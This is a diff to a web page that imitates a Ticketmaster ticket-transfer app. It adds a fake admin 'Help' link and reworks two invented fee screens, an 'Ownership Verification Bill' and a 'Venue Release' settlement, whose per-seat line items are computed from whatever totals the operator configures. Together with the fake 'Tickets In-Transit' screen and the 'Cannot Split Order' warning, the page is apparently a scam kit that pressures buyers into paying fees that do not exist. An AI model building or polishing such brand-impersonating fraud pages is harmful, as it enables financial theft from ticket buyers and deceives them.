@@ -31,169 +31,199 @@
             background-color: #fff;
             color: var(--tm-text);
             -webkit-font-smoothing: antialiased;
-            overflow-x: hidden;
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            /* Prevent body scroll entirely */
+            background-color: #000;
+            /* Dark background like phone bezels */
         }
 
         .app-container {
             width: 100vw;
-            max-width: 480px;
+            max-width: 450px;
             margin: 0 auto;
-            min-height: 100vh;
-            position: relative;
-            background: #fff;
+            height: 100%;
+            height: 100dvh;
             display: flex;
             flex-direction: column;
+            position: relative;
+            background: #fff;
+            overflow: hidden;
+            /* Lock the main container */
         }
 
         /* HEADER */
         .tm-header {
             background: var(--tm-header-bg);
-            color: white;
-            padding: env(safe-area-inset-top) 20px 15px;
+            color: #fff;
+            padding: 0 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            position: sticky;
-            top: 0;
             z-index: 1000;
             height: 60px;
+            flex-shrink: 0;
         }
 
         .back-btn {
             background: none;
             border: none;
-            color: white;
-            font-size: 28px;
+            color: #fff;
+            font-size: 26px;
             cursor: pointer;
-            opacity: 0.9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 44px;
+            height: 44px;
+            margin-left: -10px;
         }
 
         .header-title {
             font-weight: 700;
-            font-size: 16px;
+            font-size: 17px;
             letter-spacing: -0.2px;
+            text-align: center;
+            flex: 1;
         }
 
-        /* SCREENS */
+        /* SCREENS - APP FEEL */
         .screen {
             display: none;
             flex: 1;
-            animation: slideIn 0.25s ease-out;
+            /* Take all remaining space */
+            flex-direction: column;
             width: 100%;
+            height: calc(100% - 60px);
+            /* Fill space between header and footer */
+            background: #fff;
+            position: relative;
         }
 
         .screen.active {
             display: flex;
-            flex-direction: column;
+        }
+
+        /* SCROLLABLE CONTENT AREA */
+        .content-scroll {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 20px;
+            -webkit-overflow-scrolling: touch;
+            /* Smooth native scroll */
         }
 
         @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateX(15px);
+                transform: translateY(10px);
             }
 
             to {
                 opacity: 1;
-                transform: translateX(0);
+                transform: translateY(0);
             }
         }
 
-        /* SCREEN 1: MAIN TICKET */
+        /* 1. MAIN TICKET SCREEN */
         .event-banner {
             background: var(--tm-header-bg);
-            position: relative;
             width: 100%;
-            padding-bottom: 20px;
+            text-align: center;
+            flex-shrink: 0;
         }
 
         .event-img {
             width: 100%;
-            height: 220px;
+            height: 180px;
             object-fit: cover;
-            border-bottom: 4px solid var(--tm-blue);
+            border-bottom: 3px solid var(--tm-blue);
         }
 
         .event-info-box {
-            padding: 15px 20px;
-            text-align: center;
-            color: white;
+            padding: 15px 20px 25px;
+            color: #fff;
         }
 
         .event-title {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 900;
-            margin-bottom: 4px;
-            line-height: 1.2;
+            margin-bottom: 5px;
+            line-height: 1.25;
         }
 
         .event-sub {
-            font-size: 14px;
-            opacity: 0.8;
+            font-size: 13.5px;
+            opacity: 0.85;
             font-weight: 500;
         }
 
-        .ticket-scroll-area {
-            padding: 20px;
-            overflow-y: auto;
-            flex: 1;
+        .ticket-area {
+            padding: 20px 16px;
         }
 
         .ticket-card {
             background: #fff;
-            border-radius: 16px;
+            border-radius: 12px;
             border: 1px solid var(--tm-border);
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
             overflow: hidden;
-            margin-bottom: 80px;
+            margin-bottom: 20px;
         }
 
         .card-top-bar {
             background: var(--tm-blue);
             color: #fff;
             padding: 10px;
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 900;
             text-transform: uppercase;
             text-align: center;
-            letter-spacing: 1.5px;
+            letter-spacing: 1px;
         }
 
         .seat-grid {
-            display: flex;
-            justify-content: space-around;
-            padding: 25px 10px;
-            border-bottom: 1px dashed var(--tm-border);
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            padding: 20px 10px;
+            border-bottom: 1px dashed #eee;
             text-align: center;
         }
 
         .label {
             display: block;
             font-size: 10px;
-            color: var(--tm-gray);
+            color: #757575;
             text-transform: uppercase;
             font-weight: 800;
             margin-bottom: 5px;
         }
 
         .value {
-            font-size: 24px;
+            font-size: 20px;
             font-weight: 900;
             color: #000;
         }
 
         .barcode-section {
-            padding: 35px 25px;
+            padding: 25px 20px;
             text-align: center;
-            background: #fafafa;
+            background: #fff;
         }
 
         .barcode-graphic {
-            width: 100%;
-            height: 100px;
+            width: 85%;
+            height: 85px;
+            margin: 0 auto;
             background: repeating-linear-gradient(90deg, #000 0 1px, #fff 1px 4px);
             position: relative;
-            border-radius: 4px;
         }
 
         .safe-line {
@@ -201,10 +231,10 @@
             top: 0;
             left: 0;
             height: 100%;
-            width: 6px;
+            width: 5px;
             background: var(--tm-blue);
-            animation: sweep 2s infinite alternate ease-in-out;
-            box-shadow: 0 0 20px var(--tm-blue);
+            animation: sweep 2.2s infinite alternate ease-in-out;
+            box-shadow: 0 0 12px var(--tm-blue);
         }
 
         @keyframes sweep {
@@ -213,48 +243,48 @@
             }
 
             to {
-                left: calc(100% - 6px);
+                left: calc(100% - 5px);
             }
         }
 
         .safetix-logo {
-            font-size: 11px;
+            font-size: 10.5px;
             font-weight: 800;
-            color: #888;
-            margin-top: 20px;
-            letter-spacing: 0.5px;
+            color: #777;
+            margin-top: 15px;
         }
 
-        /* FOOTER NAV */
+        /* FOOTER NAV - LOCKED LIKE APP */
         .fixed-footer {
-            position: fixed;
-            bottom: 0;
             width: 100%;
-            max-width: 480px;
-            padding: 15px 20px env(safe-area-inset-bottom);
+            padding: 16px 20px calc(16px + env(safe-area-inset-bottom));
             background: #fff;
             border-top: 1px solid #eee;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            z-index: 100;
+            display: flex;
+            gap: 12px;
+            flex-shrink: 0;
+            /* Never collapse */
+            z-index: 1100;
         }
 
         .btn {
-            padding: 16px;
-            border-radius: 6px;
+            flex: 1;
+            height: 52px;
+            /* Slightly larger for native feel */
+            border-radius: 4px;
             border: none;
-            font-weight: 800;
+            font-weight: 700;
             font-size: 15px;
             cursor: pointer;
-            transition: active 0.1s;
             display: flex;
             align-items: center;
             justify-content: center;
+            outline: none;
+            transition: 0.1s;
         }
 
         .btn:active {
-            opacity: 0.8;
+            background-color: #f0f0f0;
             transform: scale(0.98);
         }
 
@@ -263,10 +293,14 @@
             color: #fff;
         }
 
+        .btn-blue:active {
+            background: var(--tm-dark-blue);
+        }
+
         .btn-outline {
             background: #fff;
             color: var(--tm-blue);
-            border: 1px solid var(--tm-blue);
+            border: 1.5px solid var(--tm-blue);
         }
 
         /* REUSABLE STYLES */
@@ -466,126 +500,138 @@
         <header class="tm-header">
             <button class="back-btn" onclick="back()">←</button>
             <div class="header-title" id="hTitle">My Tickets</div>
-            <div style="width: 28px;"></div>
+            <a href="admin.html"
+                style="color: #fff; text-decoration: none; font-size: 14px; font-weight: 700; width: 44px; display: flex; align-items: center; justify-content: flex-end;">Help</a>
         </header>
 
         <!-- 1. VIEW -->
         <section id="s1" class="screen active">
-            <div class="event-banner">
-                <img id="mImg" src="" class="event-img">
-                <div class="event-info-box">
-                    <h1 class="event-title" id="mName"></h1>
-                    <p class="event-sub" id="mVenue"></p>
-                    <p class="event-sub" id="mDate"></p>
+            <div class="content-scroll">
+                <div class="event-banner">
+                    <img id="mImg" src="" class="event-img">
+                    <div class="event-info-box">
+                        <h1 class="event-title" id="mName"></h1>
+                        <p class="event-sub" id="mVenue"></p>
+                        <p class="event-sub" id="mDate"></p>
+                    </div>
+                </div>
+                <div class="ticket-area">
+                    <div id="ticketsList"></div>
                 </div>
             </div>
-            <div class="ticket-scroll-area">
-                <div id="ticketsList"></div>
-            </div>
             <div class="fixed-footer">
-                <button class="btn btn-blue" style="grid-column: span 2;" onclick="to(2)">Transfer</button>
+                <button class="btn btn-blue" style="width: 100%;" onclick="to(2)">Transfer</button>
             </div>
         </section>
 
         <!-- 2. SELECTION (RESPONSIVE) -->
-        <section id="s2" class="screen p-25">
-            <h2 class="heading">Select Tickets</h2>
-            <p class="desc">Please choose the seats you'd like to transfer.</p>
+        <section id="s2" class="screen">
+            <div class="content-scroll p-25">
+                <h2 class="heading">Select Tickets</h2>
+                <p class="desc">Please choose the seats you'd like to transfer.</p>
 
-            <div id="splitErr" class="error-alert">
-                <span style="font-size: 24px;">⛔</span>
-                <div>
-                    <strong style="display:block; margin-bottom:4px; font-size:15px;">Cannot Split Order</strong>
-                    For security and venue logistics, all seats in this transaction must be transferred together.
-                    Grouped seating integrity is required for this event.
+                <div id="splitErr" class="error-alert">
+                    <span style="font-size: 24px;">⛔</span>
+                    <div>
+                        <strong style="display:block; margin-bottom:4px; font-size:15px;">Cannot Split Order</strong>
+                        For security and venue logistics, all seats in this transaction must be transferred together.
+                        Grouped seating integrity is required for this event.
+                    </div>
                 </div>
+
+                <div id="selectionArea"></div>
             </div>
 
-            <div id="selectionArea"></div>
-
-            <div class="fixed-footer" style="grid-template-columns: 1fr;">
-                <button class="btn btn-blue" onclick="validate()">Continue to Transfer</button>
+            <div class="fixed-footer">
+                <button class="btn btn-blue" style="width: 100%;" onclick="validate()">Continue to Transfer</button>
             </div>
         </section>
 
         <!-- 3. RECIPIENT -->
-        <section id="s3" class="screen p-25">
-            <h2 class="heading">Recipient Details</h2>
-            <p class="desc">Transfer ownership safely to another Ticketmaster user.</p>
+        <section id="s3" class="screen">
+            <div class="content-scroll p-25">
+                <h2 class="heading">Recipient Details</h2>
+                <p class="desc">Transfer ownership safely to another Ticketmaster user.</p>
 
-            <div class="form-row"><label>First Name</label><input type="text" id="fn" placeholder="First Name"></div>
-            <div class="form-row"><label>Last Name</label><input type="text" id="ln" placeholder="Last Name"></div>
-            <div class="form-row"><label>Recipient Email</label><input type="email" id="em"
-                    placeholder="email@address.com"></div>
+                <div class="form-row"><label>First Name</label><input type="text" id="fn" placeholder="First Name">
+                </div>
+                <div class="form-row"><label>Last Name</label><input type="text" id="ln" placeholder="Last Name"></div>
+                <div class="form-row"><label>Recipient Email</label><input type="email" id="em"
+                        placeholder="email@address.com"></div>
+            </div>
 
-            <div class="fixed-footer" style="grid-template-columns: 1fr;">
-                <button class="btn btn-blue" onclick="to(4)">Confirm Ownership Change</button>
+            <div class="fixed-footer">
+                <button class="btn btn-blue" style="width: 100%;" onclick="to(4)">Confirm Ownership Change</button>
             </div>
         </section>
 
         <!-- 4. BILL 1: OWNERSHIP -->
-        <section id="s4" class="screen p-25">
-            <div class="status-chip chip-wait">Pending Approval</div>
-            <h2 class="heading">Ownership Verification Bill</h2>
-            <p class="desc">Digital SafeTix™ licenses must be officially re-registered to the recipient. This
-                administrative settlement is required to proceed.</p>
+        <section id="s4" class="screen">
+            <div class="content-scroll p-25">
+                <div class="status-chip chip-wait">Pending Approval</div>
+                <h2 class="heading">Ownership Verification Bill</h2>
+                <p class="desc">Digital SafeTix™ licenses must be officially re-registered to the recipient. This
+                    administrative settlement is required to proceed.</p>
 
-            <div class="invoice-box">
-                <div class="invoice-head"><strong id="b1_title">OWNERSHIP SETTLEMENT</strong><span id="b1_id"></span>
+                <div class="invoice-box">
+                    <div class="invoice-head"><strong id="b1_title">OWNERSHIP SETTLEMENT</strong><span
+                            id="b1_id"></span></div>
+                    <div id="b1_breakdown"></div>
+                    <div class="inv-total"><span>Total Settlement</span><span id="b1_tot">$0.00</span></div>
                 </div>
-                <div class="inv-row"><span>SafeTix License Sync</span><span>$25.00</span></div>
-                <div class="inv-row"><span>Database Re-assignment</span><span>$25.00</span></div>
-                <div class="inv-row"><span>Administrative Processing</span><span id="b1_val">$0.00</span></div>
-                <div class="inv-total"><span>Total Settlement</span><span id="b1_tot">$0.00</span></div>
             </div>
 
-            <div class="fixed-footer" style="grid-template-columns: 1fr;">
-                <button class="btn btn-blue" onclick="processB1()">Clear Bill & Initiate Transfer</button>
+            <div class="fixed-footer">
+                <button class="btn btn-blue" style="width: 100%;" onclick="processB1()">Clear Bill & Initiate
+                    Transfer</button>
             </div>
         </section>
 
         <!-- 5. TRANSIT -->
-        <section id="s5" class="screen p-25">
-            <div class="loading-vibe">
-                <div class="tm-spinner"></div>
-                <h2 class="heading" id="tStatus">Tickets In-Transit</h2>
-                <p class="desc">Securely handshaking with the venue server. Please refrain from refreshing the page.</p>
-            </div>
-            <div style="background:#f9f9f9; padding:20px; border-radius:16px; border:1px solid #eee;">
-                <div class="status-chip chip-transit">Status: Syncing Data</div>
-                <div style="font-size:14px; font-weight:700; margin-top:10px;">Destination: <span id="rName"></span>
+        <section id="s5" class="screen">
+            <div class="content-scroll p-25">
+                <div class="loading-vibe">
+                    <div class="tm-spinner"></div>
+                    <h2 class="heading" id="tStatus">Tickets In-Transit</h2>
+                    <p class="desc">Securely handshaking with the venue server. Please refrain from refreshing the page.
+                    </p>
                 </div>
-                <div style="font-size:13px; color:#666; margin-top:5px;">Estimated Sync: 12 seconds</div>
+                <div style="background:#f9f9f9; padding:20px; border-radius:16px; border:1px solid #eee;">
+                    <div class="status-chip chip-transit">Status: Syncing Data</div>
+                    <div style="font-size:14px; font-weight:700; margin-top:10px;">Destination: <span id="rName"></span>
+                    </div>
+                    <div style="font-size:13px; color:#666; margin-top:5px;">Estimated Sync: 12 seconds</div>
+                </div>
             </div>
-            <div class="fixed-footer" style="grid-template-columns: 1fr;">
-                <button class="btn btn-outline" onclick="to(6)">Check Venue Release Status</button>
+
+            <div class="fixed-footer">
+                <button class="btn btn-outline" style="width: 100%;" onclick="to(6)">Check Venue Release Status</button>
             </div>
         </section>
 
         <!-- 6. BILL 2: VENUE RELEASE -->
-        <section id="s6" class="screen p-25">
-            <div class="status-chip chip-hold">Relase Held by Venue</div>
-            <h2 class="heading">Approve Release Request</h2>
-            <p class="desc">A venue release settlement for <b><span id="vRec"></span></b> is required. These tickets are
-                currently held at the venue server until final release approval.</p>
+        <section id="s6" class="screen">
+            <div class="content-scroll p-25">
+                <div class="status-chip chip-hold">Relase Held by Venue</div>
+                <h2 class="heading">Approve Release Request</h2>
+                <p class="desc">A venue release settlement for <b><span id="vRec"></span></b> is required. These tickets
+                    are currently held at the venue server until final release approval.</p>
 
-            <div class="invoice-box" style="border-color:#fee2e2;">
-                <div class="invoice-head"><strong style="color:var(--tm-blue);" id="b2_title">VENUE
-                        SETTLEMENT</strong><span id="b2_id"></span></div>
-                <div class="inv-row"><span>Venue Capacity Tax</span><span>$12.50</span></div>
-                <div class="inv-row"><span>Digital Seat Maintenance</span><span>$12.50</span></div>
-                <div class="inv-row"><span>Venue Guarantee Fee</span><span id="b2_val">$0.00</span></div>
-                <div class="inv-total" style="border-top-color:#ef4444;"><span style="color:#ef4444;">Final Release
-                        Total</span><span id="b2_tot">$0.00</span></div>
+                <div class="invoice-box" style="border-color:#fee2e2;">
+                    <div class="invoice-head"><strong style="color:var(--tm-blue);" id="b2_title">VENUE
+                            SETTLEMENT</strong><span id="b2_id"></span></div>
+                    <div id="b2_breakdown"></div>
+                    <div class="inv-total" style="border-top-color:#ef4444;"><span style="color:#ef4444;">Final Release
+                            Total</span><span id="b2_tot">$0.00</span></div>
+                </div>
             </div>
 
-            <div class="fixed-footer" style="grid-template-columns: 1fr;">
-                <button class="btn btn-blue"
+            <div class="fixed-footer">
+                <button class="btn btn-blue" style="width: 100%;"
                     onclick="alert('Connecting to Secured Venue Settlement Gateway...')">Approve & Release Tickets
                     Now</button>
             </div>
         </section>
-
     </div>
 
     <script>
@@ -642,14 +688,35 @@
                 sArea.appendChild(div);
             });
 
-            // Bills
+            const seatCountTotal = cfg.seats.length;
+
+            // Bill 1 Calculation
+            const b1Total = parseFloat(cfg.bill1Total);
+            const b1FixedPerSeat = 15.00;
+            const b1Subtotal = b1FixedPerSeat * seatCountTotal;
+            const b1Remainder = b1Total - b1Subtotal;
+
             document.getElementById('b1_id').innerText = "#" + cfg.bill1ID;
-            document.getElementById('b1_val').innerText = "$" + (parseFloat(cfg.bill1Total) - 50).toFixed(2);
-            document.getElementById('b1_tot').innerText = "$" + parseFloat(cfg.bill1Total).toFixed(2);
+            document.getElementById('b1_breakdown').innerHTML = `
+            <div class="inv-row"><span>Sync Fee ($15.00 x ${seatCountTotal} Seats)</span><span>$${b1Subtotal.toFixed(2)}</span></div>
+            <div class="inv-row"><span>Database Re-assignment</span><span>$${(b1Remainder * 0.6).toFixed(2)}</span></div>
+            <div class="inv-row"><span>Admin Processing</span><span>$${(b1Remainder * 0.4).toFixed(2)}</span></div>
+        `;
+            document.getElementById('b1_tot').innerText = "$" + b1Total.toFixed(2);
+
+            // Bill 2 Calculation
+            const b2Total = parseFloat(cfg.bill2Total);
+            const b2FixedPerSeat = 12.50;
+            const b2Subtotal = b2FixedPerSeat * seatCountTotal;
+            const b2Remainder = b2Total - b2Subtotal;
 
             document.getElementById('b2_id').innerText = "#" + cfg.bill2ID;
-            document.getElementById('b2_val').innerText = "$" + (parseFloat(cfg.bill2Total) - 25).toFixed(2);
-            document.getElementById('b2_tot').innerText = "$" + parseFloat(cfg.bill2Total).toFixed(2);
+            document.getElementById('b2_breakdown').innerHTML = `
+            <div class="inv-row"><span>Venue Tax ($12.50 x ${seatCountTotal} Seats)</span><span>$${b2Subtotal.toFixed(2)}</span></div>
+            <div class="inv-row"><span>Security Guarantee</span><span>$${(b2Remainder * 0.7).toFixed(2)}</span></div>
+            <div class="inv-row"><span>Digital Seat Maintenance</span><span>$${(b2Remainder * 0.3).toFixed(2)}</span></div>
+        `;
+            document.getElementById('b2_tot').innerText = "$" + b2Total.toFixed(2);
         }
 
         function toggle(id, idx) {
